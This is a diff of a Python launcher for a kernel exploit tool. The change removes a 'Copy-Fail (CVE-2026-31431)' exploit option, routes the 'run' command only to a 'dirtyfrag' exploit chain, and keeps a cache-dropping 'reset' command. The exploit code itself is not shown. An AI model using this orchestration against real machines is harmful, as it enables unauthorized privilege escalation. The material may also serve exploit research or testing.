@@ -32,28 +32,9 @@ def execute_dirtyfrag(passthrough_args):
         print(f"[-] Execution tracking error: {e}", file=sys.stderr)
         sys.exit(1)
 
-def execute_copyfail():
-    """Dynamically executes the Copy-Fail exploit script logic."""
-    try:
-        import dirtyfrag.copy_fail_exp as copy_fail
-        print("[*] Executing Copy-Fail (CVE-2026-31431) Exploit Subsystem...")
-        if hasattr(copy_fail, 'main'):
-            copy_fail.main()
-        else:
-            script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "copy_fail_exp.py")
-            subprocess.run([sys.executable, script_path])
-    except ImportError:
-        print("[-] Error: copy_fail_exp.py component is not installed inside the module namespace.", file=sys.stderr)
-        sys.exit(1)
-
 def handle_run(args, passthrough_args):
-    """Router for execution targets based on selected method."""
-    if args.method == "dirtyfrag":
-        execute_dirtyfrag(passthrough_args)
-    elif args.method == "copyfail":
-        if passthrough_args:
-            print(f"[!] Warning: Ignoring arguments {passthrough_args} not supported by Copy-Fail runtime.")
-        execute_copyfail()
+    """Router for execution targets."""
+    execute_dirtyfrag(passthrough_args)
 
 def handle_reset():
     """Clears page cache, dentries, and inodes via /proc/sys/vm/drop_caches.
@@ -96,14 +77,8 @@ def main():
     
     subparsers = parser.add_subparsers(dest="command", required=True, help="Subcommand to execute")
     
-    # 'run' subcommand
-    run_parser = subparsers.add_parser("run", help="Initiate exploit chain orchestration")
-    run_parser.add_argument(
-        "--method", 
-        choices=["dirtyfrag", "copyfail"], 
-        default="dirtyfrag", 
-        help="Specify vulnerability targeting methodology (default: dirtyfrag)"
-    )
+    # 'run' subcommand 
+    subparsers.add_parser("run", help="Initiate exploit chain orchestration")
     
     # 'reset' subcommand
     subparsers.add_parser("reset", help="Clear kernel system cache (drop_caches)")
@@ -115,3 +90,5 @@ def main():
     elif args.command == "reset":
         handle_reset()
 
+if __name__ == "__main__":
+    main()
